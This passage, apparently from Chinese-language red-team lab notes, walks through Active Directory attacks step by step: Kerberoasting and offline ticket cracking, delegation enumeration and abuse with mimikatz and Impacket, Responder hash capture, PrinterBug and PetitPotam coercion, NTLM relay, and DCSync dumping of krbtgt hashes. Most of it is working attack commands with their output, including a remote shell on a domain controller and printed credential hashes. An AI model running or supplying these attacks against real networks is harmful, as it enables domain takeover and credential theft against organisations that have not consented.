kerberos::list
```

```powershell
PS C:\Users\Administrator\Desktop> klist

Current LogonId is 0:0x2d006

Cached Tickets: (2)

#0>     Client: administrator @ GOD.ORG
        Server: krbtgt/GOD.ORG @ GOD.ORG
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 9/21/2023 16:37:31 (local)
        End Time:   9/22/2023 2:37:31 (local)
        Renew Time: 9/28/2023 16:37:31 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)


#1>     Client: administrator @ GOD.ORG
        Server: priv/test @ GOD.ORG
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 9/21/2023 16:50:57 (local)
        End Time:   9/22/2023 2:37:31 (local)
        Renew Time: 9/28/2023 16:37:31 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
```



#### 4、离线破解票据

工具1：john

```bash
└─# john --format=krb5tgs ../hash.txt --wordlist=../pass.list      
```

```
admin!@#45       (?)     
```



工具2：hashcat

```bash
hashcat -13100 hash.txt pass.txt --force 
```



工具3：kerberoast，破解的是 `.kirbi` 格式，可用工具4转化为其它格式

[GitHub - nidem/kerberoast](https://github.com/nidem/kerberoast)

```bash
python3 tgsrepcrack.py  password.txt 1-40a00000-administrator@priv~test-GOD.ORG.kirbi
```

```
admin!@#45
```



工具4：tgscrack.go  

[GitHub - leechristensen/tgscrack: Kerberos TGS_REP cracker written in Golang](https://github.com/leechristensen/tgscrack)



补充：[域渗透入门（四）Kerberoasting服务票据离线爆破密码 - whale3070's blog](https://whale3070.github.io/2020/05/04/09-x/#录制的视频教程)

kirbi2john.py 将导出的 1.kirbi 转换为 hashcat 可以破解的格式

```bash
python /usr/share/john/kirbi2john.py 2-40a00000-jerry@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi > output.txt
```



### 抓包分析

方式：

```bash
GetUserSPNs.py -request -dc-ip 192.168.2.9 god.org/webadmin:admin\!\@\#45 -outputfile hash.txt -request-user webadmin
```



以下的 etype 是不安全的 加密方式

<img src=".\图片\Snipaste_2023-09-21_17-10-43.png" alt="Snipaste_2023-09-21_17-10-43" style="zoom:80%;" />





## 委派

### 非约束委派

#### 查询

Adfind：

```bash
#主机
AdFind.exe -b "DC=redteam,DC=red" -f "(&(samAccountType=805306369) (userAccountControl:1.2.840.113556.1.4.803:=524288))" cn distinguishedName
#服务账户
AdFind.exe -b "DC=redteam,DC=red" -f "(&(samAccountType=805306368) (userAccountControl:1.2.840.113556.1.4.803:=524288))" cn distinguishedName
```

```bash
#主机
AdFind.exe -b "DC=redteam,DC=red" -f "(&(samAccountType=805306369) (userAccountControl:1.2.840.113556.1.4.803:=524288))" -dn
#服务账户
AdFind.exe -b "DC=redteam,DC=red" -f "(&(samAccountType=805306368) (userAccountControl:1.2.840.113556.1.4.803:=524288))" -dn
```

PowerSploit 下的 PowerView.ps1：

```powershell
Import-Module .\PowerView.ps1
Get-NetComputer -Unconstrained -Domain redteam.red
Get-NetUser -Unconstrained -Domain redteam.red | select name
```

Ldapsearch：

查服务账户：

```bash
ldapsearch -x -H ldap://10.211.1.210:389 -D "CN=win7,CN=Users,DC=relaysec,DC=com" -w Admin123.. -b "DC=relaysec,DC=com" "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))" | grep -iE "distinguishedName"
```

```bash
ldapsearch -x -H ldap://10.211.1.210:389 -D "hack@xie.com" -w Admin123.. -b "DC=xie,DC=com" "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))" | grep dn
```

查主机：

```powershell
ldapsearch -x -H ldap://10.211.1.210:389 -D "hack@xie.com" -w Admin123.. -b "DC=xie,DC=com" "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))" | grep dn
```





### 约束委派

#### 查询

Adfind：

```powershell
#查主机
AdFind -b "DC=redteam,DC=red" -f "(&(samAccountType=805306369)(msds-allowedtodelegateto=*))" msds-allowedtodelegateto
#查服务账户
AdFind -b "DC=redteam,DC=red" -f "(&(samAccountType=805306368)(msds-allowedtodelegateto=*))" msds-allowedtodelegateto
```

PowerView:

```powershell
#查服务账户
Get-DomainUser –TrustedToAuth -domain redteam.red -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|fl
#查机器
Get-DomainComputer -TrustedToAuth -Domain redteam.red -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|ft -Wrap -AutoSize
```

Ldapsearch：

```bash
#查找域中配置约束委派用户
ldapsearch -x -H ldap://172.16.25.242:389 -D "CN=user0x1,CN=Users,DC=networksec,DC=loacl" -w q123456. -b "DC=networksec,DC=loacl" "(&(samAccountType=805306368)(msds- allowedtodelegateto=*))" |grep -iE "distinguishedName|allowedtodelegateto"

#查找域中配置约束委派的主机：
ldapsearch -x -H ldap://172.16.25.242:389 -D "CN=user0x2,CN=Users,DC=networksec,DC=loacl" -w q123456. -b "DC=networksec,DC=loacl" "(&(samAccountType=805306369)(msds- allowedtodelegateto=*))" |grep -iE "distinguishedName|allowedtodelegateto"
```





### 基于资源的约束委派

#### 查询

查询哪些域内机器是由同一个用户加入的

```powershell
AdFind.exe -h 192.168.2.13 -b "DC=redteam,DC=red" -f "objectClass=computer" mS-DS-CreatorSID
sid2user.exe \\192.168.2.13 5 21 1695257952 3088263962 2055235443 1104  # 后面参数是该用户的 SID
```

PowerView：

```powershell
Get-ObjectAcl -SamAccountName "username" -ResolveGUIDs | out-file save.txt
```



查询某个账户是否具有委派性

PowerView.ps1：

```powershell
Import-Module .\PowerView.ps1

#查看非约束性和约束性委派
Get-DomainUser 域账户名 -Properties useraccountcontrol,msds-allowedtodelegateto | fl
Get-DomainComputer 机器账户名 -Properties useraccountcontrol,msds-allowedtodelegateto | fl

#查看基于资源的约束性委派
Get-DomainUser 域账户名 -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
Get-DomainComputer 机器账户名 -Properties msDS-AllowedToActOnBehalfOfOtherIdentity 
```

当该账户没有委派属性时，只有 userAccountControl 属性有值

- 服务账户的值为 NORMAL_ACCOUNT

- 机器账户的值为 WORKSTATION_TRUST_ACCOUNT



### 实验1：非约束委派

查询非约束委派的机器，为 `sqlserver-2008`

```powershell
Import-Module .\PowerView.ps1
Get-NetComputer -Unconstrained -Domain redteam.red
```

正常情况下在 `sqlserver-2008` 上访问域控为拒绝

```
C:\Users\sqlserver>dir \\owa.redteam.red\c$
拒绝访问。
```

此时诱惑域控连接 sqlserver-2008 

```
net use \\sqlserver-2008.redteam.red 
```

接着在 sqlserver-2008 这台机器上用 管理员权限运行 mimkatz，并且导出票据

```
privilege::debug
sekurlsa::tickets /export
```

会发现导出了很多票据，我们把 administrator 域控的票据导入到内存，这时候得用 sqlserver-2008 上的普通域用户 sqlserver 来运行 mimikatz 导入域控的票据

<img src=".\图片\Snipaste_2023-09-22_19-34-55.png" alt="Snipaste_2023-09-22_19-34-55" style="zoom:67%;" />

```
kerberos::ptt [0;8e5d5]-2-0-60a00000-Administrator@krbtgt-REDTEAM.RED.kirbi
```

再 sqlserver-2008 来连接域控

<img src=".\图片\Snipaste_2023-09-22_20-06-30.png" alt="Snipaste_2023-09-22_20-06-30" style="zoom:80%;" />



还可以配合打印机漏洞一起利用，这里的好处是不用诱惑域控来连接我们，使用打印机漏洞可以在 sqlserver-2008 里运行脚本使域控强制访问 sqlserver-2008，这样利用面便更广了



### 实验2：约束委派

查询配置了约束委派的服务账户和 被委派的 spn

```
AdFind -b "DC=redteam,DC=red" -f "(&(samAccountType=805306368)(msds-allowedtodelegateto=*))" msds-allowedtodelegateto
```

```
C:\Users\sqlserver\Desktop>AdFind -b "DC=redteam,DC=red" -f "(&(samAccountType=805306368)(msds-allow
edtodelegateto=*))" msds-allowedtodelegateto

AdFind V01.52.00cpp Joe Richards (support@joeware.net) January 2020

Using server: owa.redteam.red:389
Directory: Windows Server 2008 R2

dn:CN=sqlserver,CN=Users,DC=redteam,DC=red
>msDS-AllowedToDelegateTo: cifs/owa.redteam.red/redteam.red
>msDS-AllowedToDelegateTo: cifs/owa.redteam.red
>msDS-AllowedToDelegateTo: cifs/OWA
>msDS-AllowedToDelegateTo: cifs/owa.redteam.red/REDTEAM
>msDS-AllowedToDelegateTo: cifs/OWA/REDTEAM


1 Objects returned
```

再到 kali 里绑定 hosts

```bash
echo '192.168.2.15 owa.redteam.red redteam.red' >> /etc/hosts
```

再到 kali 里操作：

```bash
# 以 test 身份申请一张访问  cifs/owa.redteam.red 的服务票据
getST.py -dc-ip 192.168.2.15 redteam.red/sqlserver:Server12345 -spn cifs/owa.redteam.red  -impersonate administrator
# 导入票据
export KRB5CCNAME=administrator.ccache
# 远程访问域控
smbexec.py -no-pass -k owa.redteam.red
```

```bash
└─# smbexec.py -no-pass -k owa.redteam.red -codec gbk  
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>ipconfig

Windows IP 配置


以太网适配器 本地连接 3:

   连接特定的 DNS 后缀 . . . . . . . : 
   本地链接 IPv6 地址. . . . . . . . : fe80::e516:9d12:5f9f:7342%20
   IPv4 地址 . . . . . . . . . . . . : 192.168.2.15
   子网掩码  . . . . . . . . . . . . : 255.255.255.0
   默认网关. . . . . . . . . . . . . : fe80::100%20
                                       192.168.2.1

以太网适配器 本地连接:

   连接特定的 DNS 后缀 . . . . . . . : 
   本地链接 IPv6 地址. . . . . . . . : fe80::c06e:7d8c:89dd:2b63%11
   IPv4 地址 . . . . . . . . . . . . : 10.10.10.8
   子网掩码  . . . . . . . . . . . . : 255.255.255.0
   默认网关. . . . . . . . . . . . . : 10.10.10.1

隧道适配器 isatap.{93029FBE-D5D9-4FBA-A992-68F5E9EC7241}:

   媒体状态  . . . . . . . . . . . . : 媒体已断开
   连接特定的 DNS 后缀 . . . . . . . : 

隧道适配器 isatap.{F00E4250-A4BD-4325-AAFA-C4AD46F43082}:

   媒体状态  . . . . . . . . . . . . : 媒体已断开
   连接特定的 DNS 后缀 . . . . . . . : 
```



## NTML Relay

中间人攻击，可以类似于 arp 毒化



### 捕获 Net-NTML Hash

Responder 的用法

```bash
Usage: responder -I eth0 -w -d
or:
responder -I eth0 -wd

Options:
  --version             show program's version number and exit
  -h, --help            show this help message and exit
  -A, --analyze         Analyze mode. This option allows you to see NBT-NS,
                        BROWSER, LLMNR requests without responding.
  -I eth0, --interface=eth0
                        Network interface to use, you can use 'ALL' as a
                        wildcard for all interfaces
  -i 10.0.0.21, --ip=10.0.0.21
                        Local IP to use (only for OSX)
  -6 2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed, --externalip6=2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed
                        Poison all requests with another IPv6 address than
                        Responder's one.
  -e 10.0.0.22, --externalip=10.0.0.22
                        Poison all requests with another IP address than
                        Responder's one.
  -b, --basic           Return a Basic HTTP authentication. Default: NTLM
  -d, --DHCP            Enable answers for DHCP broadcast requests. This
                        option will inject a WPAD server in the DHCP response.
                        Default: False
  -D, --DHCP-DNS        This option will inject a DNS server in the DHCP
                        response, otherwise a WPAD server will be added.
                        Default: False
  -w, --wpad            Start the WPAD rogue proxy server. Default value is
                        False
  -u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY
                        Upstream HTTP proxy used by the rogue WPAD Proxy for
                        outgoing requests (format: host:port)
  -F, --ForceWpadAuth   Force NTLM/Basic authentication on wpad.dat file
                        retrieval. This may cause a login prompt. Default:
                        False
  -P, --ProxyAuth       Force NTLM (transparently)/Basic (prompt)
                        authentication for the proxy. WPAD doesn't need to be
                        ON. This option is highly effective. Default: False
  --lm                  Force LM hashing downgrade for Windows XP/2003 and
                        earlier. Default: False
  --disable-ess         Force ESS downgrade. Default: False
  -v, --verbose         Increase verbosity.
```



#### 1、LLMNR&NBNS协议 攻击示例

Responder 监听

```bash
─# responder -I eth0 -wd
```

域控触发：

<img src=".\图片\Snipaste_2023-09-22_21-53-10.png" alt="Snipaste_2023-09-22_21-53-10" style="zoom:80%;" />

<img src=".\图片\Snipaste_2023-09-22_21-54-02.png" alt="Snipaste_2023-09-22_21-54-02" style="zoom:80%;" />

Responder监听到 NTLMV2 Hash

```bash
[WebDAV] NTLMv2 Client   : 192.168.2.15
[WebDAV] NTLMv2 Username : REDTEAM\Administrator
[WebDAV] NTLMv2 Hash     : Administrator::REDTEAM:430c49c0624b6237:0896CB0620C6C1231CC1C8FC984E4C18:01010000000000004F450D385CEDD901E7A7EE41B765BA6800000000020008004900570051004F0001001E00570049004E002D004F003200570032003400520043005A00430046005900040014004900570051004F002E004C004F00430041004C0003003400570049004E002D004F003200570032003400520043005A004300460059002E004900570051004F002E004C004F00430041004C00050014004900570051004F002E004C004F00430041004C000800300030000000000000000000000000300000F2C1FC1C12A6B87C37332DBF4FD121787AB3F11F4B4F93ECCA32634B6CCC78F30A0010000000000000000000000000000000000009001E0048005400540050002F007A007A007A007A007A007A007A007A007A007A000000000000000000
```



#### 2、打印机漏洞

就是让打印机强制对 攻击者 192.168.2.14 进行 NTLM 验证                [printerbug](https://github.com/dirkjanm/krbrelayx/tree/master)

```bash
python printerbug.py redteam/sqlserver:Server12345@192.168.2.15 192.168.2.14
```

同样 Responder 监听



#### 3、PetitPotam

[GitHub - topotam/PetitPotam.](https://github.com/topotam/PetitPotam)

```bash
└─# python PetitPotam.py -d redteam.red -u sqlserver -p Server12345 192.168.2.14 192.168.2.15

                                                                                               
              ___            _        _      _        ___            _                     
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
                                         
              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN



Trying pipe lsarpc
[-] Connecting to ncacn_np:192.168.2.15[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

192.168.2.15 是域控

<img src=".\图片\Snipaste_2023-09-22_22-18-13.png" alt="Snipaste_2023-09-22_22-18-13" style="zoom:80%;" />



#### 其它

还有很多骚操作让 域控对攻击机做NTLM验证，先不演示了 

- 图标
- 浏览器
- Outlook
- 系统命令
- Office
- PDF
- WPAD



### 重放 Net-NTLM Hash

域环境中，普通域用户默认可以登录到除域控外的其它机器，因此可以将域用户的 Net-NTLM Hash 中继到域内其它机器



#### 中继到smb

1、`smbrelayx.py`

```bash
smbrelayx.py -h 192.168.2.13 -c whoami
```

在等待 域控连接 192.168.2.13 的 smb 服务积即可



2、`ntlmrelayx.py`

```
ntlmrelayx.py -t smb://192.168.2.13 -c whoami -smb2support
```



3、Responder 下的 MultiRelay.py

```bash
MultiRelay.py -t 192.168.2.13 -u ALL
```





## DCSync

在域内，不同的域控制器之间，每隔15分钟都会有一次域数据的同步，当一个域控制器想从其他域控制器上面获取数据时，DC1会向DC2发起一个GetNCChanges请求，该请求的数据，包括需要同步的数据，如果需要同步的数据比较多，则会重复上面的过程。

Dcsync就是利用这个原理，通过DPS服务的GetNCChanges 接口向域控发起数据同步请求。

当获取到域内管理员的权限，**如果能修改域内普通用户的权限，使其具有DCSYNC权限的话，那么普通用户也可以导出域内的Hash**，这样就做到了一个权限维持的操作。默认只有域控主机账号和域管理员能DCSYNC，域管和邮件服务器的账户都有写ACL的权限，可以给指定用户添加Dcsync来dump域内hash



### 查询

```powershell
Adfind.exe -s subtree -b "DC=redteam,DC=red" -sdna nTSecurityDescriptor -sddl+++ -sddlfilter ;;;"Replicating Directory Changes";; -recmute
```

```
AdFind.exe -s subtree -b "DC=redteam,DC=red" -sdna nTSecurityDescriptor -sddl+++ -sddlfilter ;;;"Replicating Directory Changes All";; -recmute
```



### 攻击

```bash
└─# secretsdump.py redteam/sqlserver:Server12345@192.168.2.13 -just-dc-user krbtgt
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a67f14d5cc4fa22618c8b609e832db6:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:67075a54cf9106904392e010bcd3caec5cc3d57d3c65b42065482ae53910ddbd
krbtgt:aes128-cts-hmac-sha1-96:0513db3ca29c78c0dff2295e5ac0388c
krbtgt:des-cbc-md5:f2fee9b529703e67
krbtgt:rc4_hmac:4a67f14d5cc4fa22618c8b609e832db6
[*] Cleaning up... 
```

```
 secretsdump.py redteam/sqlserver:Server12345@192.168.2.13 -just-dc  获取所有用户的 hash
```



还可能获取明文密码，这个得域控配置了相关操作



同理工具还有 mimikatz 、powershell 脚本等



mimikatz：

```
#获取 krbtgt 的 Hash
lsadump::dcsync /domain:redteam.red /user:krbtgt
#获取所有用户的 Hash
lsadump::dcsync /domain:redteam.red /all /csv
```



powershell脚本：

```powershell
Import-Module .\Invoke-DCSync.ps1
Invoke-DCSync -DumpForest | ft -warp -autosize
Invoke-DCSync -DumpForest -Users @("krbtgt") | ft -warp -autosize
```



利用 DCSync 获取明文凭据（需要域控进行相关配置）

```bash
secretsdump.py redteam/sqlserver:Server12345@192.168.2.13 -dc-ip 192.168.2.13 just-dc-user administrator
```


